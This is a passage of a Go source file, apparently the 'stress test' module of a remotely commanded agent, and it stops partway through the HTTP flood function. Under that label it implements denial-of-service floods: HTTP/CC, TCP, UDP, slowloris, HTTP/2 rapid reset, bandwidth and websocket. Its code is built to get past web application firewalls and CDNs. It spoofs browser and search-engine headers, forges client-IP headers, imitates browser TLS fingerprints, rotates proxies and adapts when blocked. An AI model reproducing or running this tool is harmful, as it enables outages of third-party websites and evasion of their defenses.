package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
	tls2 "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// StressConfig 压力测试配置
type StressConfig struct {
	URL         string            `json:"url"`
	Method      string            `json:"method"`
	Mode        string            `json:"mode"` // http_flood | cc | https_flood | bandwidth | tcp_flood | udp_flood | slowloris | h2_reset | ws_flood
	Headers     map[string]string `json:"headers"`
	Body        string            `json:"body"`
	Concurrency int               `json:"concurrency"` // 并发数 (最高 50000)
	Duration    int               `json:"duration"`    // 持续时间(秒)
	TotalReqs   int               `json:"totalReqs"`   // 总请求数(0=按时间)
	KeepAlive   bool              `json:"keepAlive"`   // 是否复用连接
	BodySize    int               `json:"bodySize"`    // bandwidth 模式：每次发送的 KB 数
	RateLimit   int               `json:"rateLimit"`   // 限速(req/s, 0=不限)
	Proxies     []string          `json:"proxies"`     // HTTP/SOCKS5 代理列表 (http://ip:port)
	RandPaths   []string          `json:"randPaths"`   // 随机路径列表（分散 WAF URL 规则）
	ProxyAPI    string            `json:"proxyApi"`
}

// StressProgress 实时进度上报
type StressProgress struct {
	Sent       int64   `json:"sent"`
	Success    int64   `json:"success"`
	Errors     int64   `json:"errors"`
	RPS        float64 `json:"rps"`
	AvgLatency float64 `json:"avgLatency"`
	MinLatency float64 `json:"minLatency"`
	MaxLatency float64 `json:"maxLatency"`
	BytesSent  int64   `json:"bytesSent"` // 字节
	BytesRecv  int64   `json:"bytesRecv"`
	MbpsSent   float64 `json:"mbpsSent"`   // 发送速率 Mbps
	MbpsRecv   float64 `json:"mbpsRecv"`   // 接收速率 Mbps
	ActiveConn int64   `json:"activeConn"` // 当前活跃连接
	Blocked    int64   `json:"blocked"`    // 被 WAF 拦截数
	Running    bool    `json:"running"`
}

// 随机 User-Agent 池（30+ 覆盖主流浏览器/设备/爬虫）
var userAgents = []string{
	// Chrome Windows
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	// Chrome Mac
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	// Safari
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
	// Firefox
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
	// Edge
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
	// Opera
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
	// Mobile
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	// Chrome Linux
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	// Bots（混入少量伪装搜索引擎）
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	// Misc
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Vivaldi/6.7.3329.41",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Brave/125",
}

// 随机 Referer 池
var referers = []string{
	"https://www.google.com/search?q=",
	"https://www.baidu.com/s?wd=",
	"https://www.bing.com/search?q=",
	"https://search.yahoo.com/search?p=",
	"https://www.google.com.hk/search?q=",
	"https://www.sogou.com/web?query=",
	"https://www.so.com/s?q=",
	"https://duckduckgo.com/?q=",
}

// Accept-Language 池（模拟不同地区用户）
var acceptLanguages = []string{
	"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
	"en-US,en;q=0.9",
	"zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7",
	"ja,en-US;q=0.9,en;q=0.8",
	"ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
	"ru,en-US;q=0.9,en;q=0.8",
	"de,en-US;q=0.9,en;q=0.8",
	"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
	"es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
	"pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
}

// Sec-Ch-Ua 指纹池（Chromium 系浏览器特征，WAF 靠这个判断是否真浏览器）
var secChUaPool = []string{
	`"Chromium";v="125", "Not.A/Brand";v="24"`,
	`"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"`,
	`"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"`,
	`"Chromium";v="124", "Google Chrome";v="124", "Not?A_Brand";v="8"`,
	`"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`,
	`"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"`,
}

// 常见网站路径（分散 URL 级频率检测）
var defaultPaths = []string{
	"/", "/index.html", "/index.php", "/home",
	"/about", "/about-us", "/contact", "/products",
	"/services", "/blog", "/news", "/faq", "/help",
	"/search", "/category", "/archive", "/tags",
	"/user/login", "/user/register", "/api/v1/status",
	"/wp-content/themes/flavor/style.css",
	"/static/js/main.js", "/assets/css/style.css",
	"/sitemap.xml", "/robots.txt", "/favicon.ico",
}

// Cookie 名称池（伪造常见网站 Cookie 绕过 session 检测）
var cookieNames = []string{
	"__cfduid", "cf_clearance", "_ga", "_gid", "_gat_gtag",
	"PHPSESSID", "JSESSIONID", "ASP.NET_SessionId",
	"session_id", "csrftoken", "_fbp", "__stripe_mid",
	"BT_PANEL", "__51cke__", "__tins__20089419",
}

// ========== 代理轮换器 ==========
type proxyRotator struct {
	proxies []*url.URL
	count   int
	idx     int64
}

func newProxyRotator(proxyStrings []string) *proxyRotator {
	pr := &proxyRotator{}
	for _, p := range proxyStrings {
		if u, err := url.Parse(p); err == nil && u.Host != "" {
			pr.proxies = append(pr.proxies, u)
		}
	}
	pr.count = len(pr.proxies)
	return pr
}

func (pr *proxyRotator) next() *url.URL {
	if pr.count == 0 {
		return nil
	}
	idx := atomic.AddInt64(&pr.idx, 1) - 1
	return pr.proxies[idx%int64(pr.count)]
}

func (pr *proxyRotator) proxyFunc() func(*http.Request) (*url.URL, error) {
	if pr.count == 0 {
		return nil
	}
	return func(req *http.Request) (*url.URL, error) {
		return pr.next(), nil
	}
}

// ========== 浏览器指纹请求头（绕过 WAF header 检测）==========
func setBrowserHeaders(req *http.Request, isCC bool) {
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Connection", "keep-alive")

	// Sec-* 头（Chrome 现代浏览器必带，缺少即判定为机器人）
	req.Header.Set("Sec-Ch-Ua", secChUaPool[rand.Intn(len(secChUaPool))])
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	platforms := []string{`"Windows"`, `"macOS"`, `"Linux"`}
	req.Header.Set("Sec-Ch-Ua-Platform", platforms[rand.Intn(len(platforms))])
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")

	// 模拟 Referer
	req.Header.Set("Referer", referers[rand.Intn(len(referers))]+randStr(5))

	// 模拟 Cookie（绕过 cookie 存在性检测）
	numC := 2 + rand.Intn(4)
	cookies := make([]string, numC)
	for i := range cookies {
		cookies[i] = cookieNames[rand.Intn(len(cookieNames))] + "=" + randStr(20+rand.Intn(12))
	}
	req.Header.Set("Cookie", strings.Join(cookies, "; "))

	if isCC {
		req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
		req.Header.Set("Pragma", "no-cache")
		fakeIP := fmt.Sprintf("%d.%d.%d.%d",
			rand.Intn(223)+1, rand.Intn(256), rand.Intn(256), rand.Intn(254)+1)
		req.Header.Set("X-Forwarded-For", fakeIP)
		req.Header.Set("X-Real-IP", fakeIP)
		req.Header.Set("X-Client-IP", fakeIP)
		req.Header.Set("CF-Connecting-IP", fakeIP)
		req.Header.Set("True-Client-IP", fakeIP)
	}
}

// randomizeURL 为 URL 附加随机路径和查询参数，分散 WAF 频率检测
func randomizeURL(baseURL string, paths []string, isCC bool) string {
	u := baseURL
	// 路径随机化
	if len(paths) > 0 {
		base := strings.TrimRight(u, "/")
		u = base + paths[rand.Intn(len(paths))]
	}
	// 查询参数随机化
	if isCC {
		sep := "?"
		if strings.Contains(u, "?") {
			sep = "&"
		}
		u = fmt.Sprintf("%s%s_=%s&r=%s&t=%d", u, sep, randStr(8), randStr(6), time.Now().UnixNano())
	}
	return u
}

// DNS 缓存（带 TTL 防止 IP 变更后仍连旧地址）
type dnsCacheEntry struct {
	ips     []string
	expires time.Time
}

var dnsCache sync.Map // host -> *dnsCacheEntry
const dnsCacheTTL = 30 * time.Second

func cachedDialContext(dialer *net.Dialer) func(ctx context.Context, network, addr string) (net.Conn, error) {
	return func(ctx context.Context, network, addr string) (net.Conn, error) {
		host, port, err := net.SplitHostPort(addr)
		if err != nil {
			return dialer.DialContext(ctx, network, addr)
		}
		if cached, ok := dnsCache.Load(host); ok {
			entry := cached.(*dnsCacheEntry)
			if time.Now().Before(entry.expires) {
				ip := entry.ips[rand.Intn(len(entry.ips))]
				return dialer.DialContext(ctx, network, net.JoinHostPort(ip, port))
			}
			dnsCache.Delete(host)
		}
		ips, err := net.LookupHost(host)
		if err != nil || len(ips) == 0 {
			return dialer.DialContext(ctx, network, addr)
		}
		dnsCache.Store(host, &dnsCacheEntry{ips: ips, expires: time.Now().Add(dnsCacheTTL)})
		ip := ips[rand.Intn(len(ips))]
		return dialer.DialContext(ctx, network, net.JoinHostPort(ip, port))
	}
}

// ========== JA3 指纹伪装（绕过 CloudFlare/宝塔等 WAF 的 TLS 指纹检测）==========
// Go 默认的 TLS ClientHello 指纹(JA3)与浏览器完全不同，WAF 一眼识别
// 通过 utls 库模拟真实浏览器的 TLS 握手特征，使 JA3 哈希与 Chrome/Firefox 一致
var ja3Fingerprints = []tls2.ClientHelloID{
	tls2.HelloChrome_Auto,
	tls2.HelloChrome_120,
	tls2.HelloFirefox_Auto,
	tls2.HelloEdge_Auto,
	tls2.HelloSafari_Auto,
}

func utlsDialTLSContext(dialer *net.Dialer) func(ctx context.Context, network, addr string) (net.Conn, error) {
	cachedDial := cachedDialContext(dialer)
	return func(ctx context.Context, network, addr string) (net.Conn, error) {
		// TCP 连接（复用 DNS 缓存）
		tcpConn, err := cachedDial(ctx, network, addr)
		if err != nil {
			return nil, err
		}
		host, _, _ := net.SplitHostPort(addr)
		// 随机选择浏览器指纹
		fp := ja3Fingerprints[rand.Intn(len(ja3Fingerprints))]
		tlsConn := tls2.UClient(tcpConn, &tls2.Config{
			ServerName:         host,
			InsecureSkipVerify: true,
		}, fp)
		if err := tlsConn.HandshakeContext(ctx); err != nil {
			tcpConn.Close()
			return nil, err
		}
		return tlsConn, nil
	}
}

// 随机字符串（用于 CC 缓存穿透）
const randChars = "abcdefghijklmnopqrstuvwxyz0123456789"

func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = randChars[rand.Intn(len(randChars))]
	}
	return string(b)
}

// ========== WAF 响应检测 ==========
// 多维度判定：状态码 + 特征头 + 响应体关键字（宝塔/安全狗/创宇/CF 全覆盖）
func isWAFBlocked(resp *http.Response, body []byte) bool {
	// 1) CloudFlare 专属状态码
	switch resp.StatusCode {
	case 429, 444, 520, 521, 522, 523, 524:
		return true
	}
	// 2) CloudFlare 特征头
	if resp.Header.Get("Cf-Mitigated") != "" || resp.Header.Get("Cf-Chl-Bypass") != "" ||
		resp.Header.Get("Cf-Ray") != "" && resp.StatusCode >= 400 {
		return true
	}
	// 3) 通用 WAF 特征头
	srv := resp.Header.Get("Server")
	if strings.Contains(srv, "BTW") || strings.Contains(srv, "WAF") ||
		resp.Header.Get("X-Waf-Id") != "" || resp.Header.Get("X-Powered-By-Waf") != "" ||
		resp.Header.Get("X-Safe-Waf") != "" {
		return true
	}
	// 4) 已知 WAF Server 头 + 拦截状态码
	if resp.StatusCode == 403 || resp.StatusCode == 405 || resp.StatusCode == 503 || resp.StatusCode == 418 {
		if strings.Contains(strings.ToLower(srv), "cloudflare") ||
			strings.Contains(strings.ToLower(srv), "ddos-guard") ||
			strings.Contains(strings.ToLower(srv), "sucuri") ||
			strings.Contains(strings.ToLower(srv), "akamai") {
			return true
		}
	}
	// 5) 响应体关键字检测（宝塔/安全狗/创宇/长亭 等国产 WAF）
	if len(body) > 0 && resp.StatusCode >= 400 {
		// 中文关键字（大小写无关）
		if bytes.Contains(body, []byte("宝塔")) || bytes.Contains(body, []byte("攻击拦截")) ||
			bytes.Contains(body, []byte("安全防护")) || bytes.Contains(body, []byte("请求被拦截")) ||
			bytes.Contains(body, []byte("访问被拒绝")) || bytes.Contains(body, []byte("恶意请求")) ||
			bytes.Contains(body, []byte("恶意访问")) || bytes.Contains(body, []byte("非法请求")) ||
			bytes.Contains(body, []byte("安全狗")) || bytes.Contains(body, []byte("创宇盾")) ||
			bytes.Contains(body, []byte("雷池")) || bytes.Contains(body, []byte("长亭")) {
			return true
		}
		// 英文/拼音关键字（转小写检测）
		lb := bytes.ToLower(body)
		if bytes.Contains(lb, []byte("baota")) || bytes.Contains(lb, []byte("btwaf")) ||
			bytes.Contains(lb, []byte("safedog")) || bytes.Contains(lb, []byte("chuangyu")) ||
			bytes.Contains(lb, []byte("safeline")) || bytes.Contains(lb, []byte("chaitin")) ||
			bytes.Contains(lb, []byte("blocked by")) ||
			bytes.Contains(lb, []byte("web application firewall")) ||
			bytes.Contains(lb, []byte("access denied")) ||
			bytes.Contains(lb, []byte("request blocked")) {
			return true
		}
	}
	return false
}

// ========== 代理池 API 自动拉取 ==========
func fetchProxiesFromAPI(apiURL string) []string {
	if apiURL == "" {
		return nil
	}
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		log.Printf("[ProxyAPI] 拉取失败: %v", err)
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20)) // 最大 1MB
	lines := strings.Split(string(body), "\n")
	var proxies []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// 自动补全协议前缀
		if !strings.Contains(line, "://") {
			line = "http://" + line
		}
		if strings.HasPrefix(line, "http") || strings.HasPrefix(line, "socks") {
			proxies = append(proxies, line)
		}
	}
	log.Printf("[ProxyAPI] 从 %s 拉取到 %d 个代理", apiURL, len(proxies))
	return proxies
}

// ========== POST 载荷变异 ==========
// 生成随机填充的 body，避免 WAF 压缩去重和内容签名检测
func randomBodyPayload(baseBody []byte, size int) []byte {
	if size > 0 {
		// 带宽模式：全随机二进制（不可压缩），rand.Read 批量生成极快
		b := make([]byte, size*1024)
		rand.Read(b)
		return b
	}
	if len(baseBody) == 0 {
		return nil
	}
	// 在原始 body 末尾追加随机填充，使每次请求内容不同
	pad := fmt.Sprintf("&_r=%s&_t=%d", randStr(8), time.Now().UnixNano())
	return append(baseBody, []byte(pad)...)
}

// ========== 自适应节奏控制 ==========
// 仅在拦截率极高时才减速，避免误伤正常吞吐
// localCounter 由每个 worker 自增，每 128 次请求才采样一次，降低开销
func adaptiveDelay(totalSent, totalBlocked *int64, localCounter *int64) {
	c := atomic.AddInt64(localCounter, 1)
	if c&127 != 0 { // 每 128 次才检查一次
		return
	}
	sent := atomic.LoadInt64(totalSent)
	blocked := atomic.LoadInt64(totalBlocked)
	if sent < 200 {
		return // 样本太少不判断
	}
	ratio := float64(blocked) / float64(sent)
	if ratio > 0.7 {
		// 超过70%被拦截，适度减速
		time.Sleep(time.Duration(30+rand.Intn(50)) * time.Millisecond)
	} else if ratio > 0.5 {
		// 50-70% 被拦截，轻微减速
		time.Sleep(time.Duration(5+rand.Intn(15)) * time.Millisecond)
	}
	// 50%以下不做任何减速，保持全速
}

var stressRunner struct {
	mu      sync.Mutex
	cancel  context.CancelFunc
	running bool
	taskID  string
}

// raiseOpenFilesLimit 在 Linux 上提升系统限制
func raiseOpenFilesLimit() {
	if runtime.GOOS != "linux" {
		return
	}
	// prlimit 直接修改当前进程的 fd 上限（ulimit 只影响子 shell，无效）
	pid := fmt.Sprintf("%d", os.Getpid())
	exec.Command("prlimit", "--pid="+pid, "--nofile=65535:65535").Run()

	// 内核网络栈调优（需要 root）
	sysctls := [][2]string{
		{"net.ipv4.ip_local_port_range", "1024 65535"}, // 扩大临时端口范围
		{"net.ipv4.tcp_tw_reuse", "1"},                 // 复用 TIME_WAIT
		{"net.ipv4.tcp_fin_timeout", "10"},             // 加快 FIN 回收
		{"net.core.somaxconn", "65535"},                // 监听队列上限
		{"net.ipv4.tcp_max_syn_backlog", "65535"},      // SYN 队列上限
		{"net.core.netdev_max_backlog", "65535"},       // 网卡接收队列
		{"net.ipv4.tcp_max_tw_buckets", "200000"},      // TIME_WAIT 桶上限
		{"net.ipv4.tcp_syncookies", "0"},               // 关闭 syncookies（压测场景）
	}
	for _, kv := range sysctls {
		exec.Command("sysctl", "-w", kv[0]+"="+kv[1]).Run()
	}
}

func handleStressStart(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	var config StressConfig
	if err := json.Unmarshal(msg.Payload, &config); err != nil {
		log.Printf("压测配置解析失败: %v", err)
		return
	}

	if config.Method == "" {
		config.Method = "GET"
	}
	if config.Mode == "" {
		config.Mode = "http_flood"
	}
	if config.Concurrency <= 0 {
		config.Concurrency = 100
	}
	if config.Concurrency > 50000 {
		config.Concurrency = 50000
	}
	if config.Duration <= 0 && config.TotalReqs <= 0 {
		config.Duration = 30
	}
	if config.BodySize <= 0 {
		config.BodySize = 64 // 默认 64KB
	}

	stressRunner.mu.Lock()
	if stressRunner.running && stressRunner.cancel != nil {
		stressRunner.cancel()
		time.Sleep(500 * time.Millisecond)
	}
	ctx, cancel := context.WithCancel(context.Background())
	stressRunner.cancel = cancel
	stressRunner.running = true
	stressRunner.taskID = msg.ID
	stressRunner.mu.Unlock()

	// 代理池 API 自动拉取（合并到手动代理列表）
	if config.ProxyAPI != "" {
		apiProxies := fetchProxiesFromAPI(config.ProxyAPI)
		if len(apiProxies) > 0 {
			config.Proxies = append(config.Proxies, apiProxies...)
		}
	}

	// 提升系统限制
	raiseOpenFilesLimit()

	log.Printf("压力测试开始: mode=%s url=%s concurrency=%d duration=%ds proxies=%d",
		config.Mode, config.URL, config.Concurrency, config.Duration, len(config.Proxies))

	go runStress(ctx, conn, writeMu, msg.ID, config)
}

func handleStressStop(msg AgentMessage) {
	stressRunner.mu.Lock()
	defer stressRunner.mu.Unlock()
	if stressRunner.running && stressRunner.cancel != nil {
		stressRunner.cancel()
		log.Printf("压力测试已手动停止")
	}
}

func runStress(ctx context.Context, conn *websocket.Conn, writeMu *sync.Mutex, taskID string, config StressConfig) {
	// 确保压测用满所有 CPU 核心
	runtime.GOMAXPROCS(runtime.NumCPU())

	// 降低 GC 频率：默认 GOGC=100 时高并发下 GC 暂停频繁抢 CPU
	// 压测期间设为 500（5倍内存阈值才触发GC），结束后恢复
	oldGOGC := debug.SetGCPercent(500)

	defer func() {
		if r := recover(); r != nil {
			log.Printf("[Stress] runStress panic: %v", r)
		}
		debug.SetGCPercent(oldGOGC) // 恢复 GC 策略
		stressRunner.mu.Lock()
		stressRunner.running = false
		stressRunner.cancel = nil
		stressRunner.mu.Unlock()
	}()

	var (
		totalSent    int64
		totalSuccess int64
		totalErrors  int64
		totalBlocked int64
		totalLatency int64
		minLatency   int64 = int64(time.Hour)
		maxLatency   int64
		bytesSent    int64
		bytesRecv    int64
		activeConn   int64
	)

	workerCtx, workerCancel := context.WithCancel(ctx)
	defer workerCancel()

	// 定时结束
	if config.Duration > 0 {
		go func() {
			select {
			case <-time.After(time.Duration(config.Duration) * time.Second):
				workerCancel()
			case <-workerCtx.Done():
			}
		}()
	}

	var wg sync.WaitGroup

	switch config.Mode {
	case "tcp_flood":
		runTCPFlood(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	case "udp_flood":
		runUDPFlood(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	case "slowloris":
		runSlowloris(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	case "bandwidth":
		runBandwidthFlood(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	case "https_flood":
		runHTTPSFlood(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors, &totalBlocked,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	case "h2_reset":
		runH2RapidReset(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors, &totalBlocked,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	case "ws_flood":
		runWebSocketFlood(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	default: // http_flood, cc
		runHTTPFlood(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors, &totalBlocked,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	}

	// 进度上报
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	var lastSent, lastBytesSent, lastBytesRecv int64
	startTime := time.Now()

	done := make(chan struct{})
	go func() { wg.Wait(); close(done) }()

	for {
		select {
		case <-ticker.C:
			sent := atomic.LoadInt64(&totalSent)
			bs := atomic.LoadInt64(&bytesSent)
			br := atomic.LoadInt64(&bytesRecv)

			rps := float64(sent - lastSent)
			mbpsSent := float64(bs-lastBytesSent) * 8 / 1e6
			mbpsRecv := float64(br-lastBytesRecv) * 8 / 1e6
			lastSent = sent
			lastBytesSent = bs
			lastBytesRecv = br

			p := makeProgress(sent, &totalSuccess, &totalErrors, &totalBlocked, &totalLatency,
				&minLatency, &maxLatency, rps, bs, br, mbpsSent, mbpsRecv, &activeConn, true)
			sendStressMsg(conn, writeMu, "stress_progress", taskID, p)

		case <-done:
			goto finish
		}
	}

finish:
	sent := atomic.LoadInt64(&totalSent)
	elapsed := time.Since(startTime).Seconds()
	if elapsed < 0.001 {
		elapsed = 0.001
	}
	bs := atomic.LoadInt64(&bytesSent)
	br := atomic.LoadInt64(&bytesRecv)
	avgRPS := float64(sent) / elapsed
	avgMbpsSent := float64(bs) * 8 / 1e6 / elapsed
	avgMbpsRecv := float64(br) * 8 / 1e6 / elapsed

	final := makeProgress(sent, &totalSuccess, &totalErrors, &totalBlocked, &totalLatency,
		&minLatency, &maxLatency, avgRPS, bs, br, avgMbpsSent, avgMbpsRecv, &activeConn, false)
	sendStressMsg(conn, writeMu, "stress_done", taskID, final)

	log.Printf("压力测试完成: mode=%s sent=%d success=%d errors=%d blocked=%d avgRPS=%.0f sent=%.1fMB recv=%.1fMB",
		config.Mode, sent, atomic.LoadInt64(&totalSuccess), atomic.LoadInt64(&totalErrors),
		atomic.LoadInt64(&totalBlocked), avgRPS, float64(bs)/1e6, float64(br)/1e6)
}

// ========== HTTP Flood / CC 模式 ==========
func runHTTPFlood(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalBlocked, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	isHTTPS := strings.HasPrefix(strings.ToLower(config.URL), "https://")
	dialer := &net.Dialer{Timeout: 2 * time.Second, KeepAlive: 30 * time.Second}
	tlsCfg := &tls.Config{
		InsecureSkipVerify: true,
		ClientSessionCache: tls.NewLRUClientSessionCache(2048),
	}
	transport := &http.Transport{
		TLSClientConfig:       tlsCfg,
		MaxIdleConns:          config.Concurrency + 100,
		MaxIdleConnsPerHost:   config.Concurrency,
		MaxConnsPerHost:       0,
		DisableKeepAlives:     !config.KeepAlive,
		DisableCompression:    true,
		IdleConnTimeout:       10 * time.Second,
		ResponseHeaderTimeout: 3 * time.Second,
		TLSHandshakeTimeout:   3 * time.Second,
		ForceAttemptHTTP2:     isHTTPS,
		WriteBufferSize:       4 * 1024,
		ReadBufferSize:        4 * 1024,
		DialContext:           cachedDialContext(dialer),
	}

	// 代理轮换（绕过 IP 封禁，最关键的反 WAF 手段）
	proxyRot := newProxyRotator(config.Proxies)
	if proxyRot.count > 0 {
		transport.Proxy = proxyRot.proxyFunc()
		transport.DialContext = nil
		log.Printf("[HTTP] 启用代理轮换: %d 个代理", proxyRot.count)
	} else if isHTTPS {
		transport.DialTLSContext = utlsDialTLSContext(dialer)
		transport.TLSClientConfig = nil
		transport.ForceAttemptHTTP2 = false
		log.Printf("[HTTP] 启用 JA3 指纹伪装 (Chrome/Firefox/Edge)")
	}

	// Cookie 会话保持（通过宝塔 Cookie 验证的关键）
	jar, _ := cookiejar.New(nil)

	clientTimeout := 4 * time.Second
	if isHTTPS {
		clientTimeout = 8 * time.Second
	}
	client := &http.Client{
		Timeout:   clientTimeout,
		Transport: transport,
		Jar:       jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	isCC := config.Mode == "cc"
	isBW := config.Mode == "bandwidth"
	var bodyBytes []byte
	if config.Body != "" {
		bodyBytes = []byte(config.Body)
	}

	// 路径池：优先用户自定义，否则用内置常见路径
	paths := config.RandPaths
	if len(paths) == 0 && isCC {
		paths = defaultPaths
	}

	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[HTTP] worker panic: %v", r)
				}
			}()
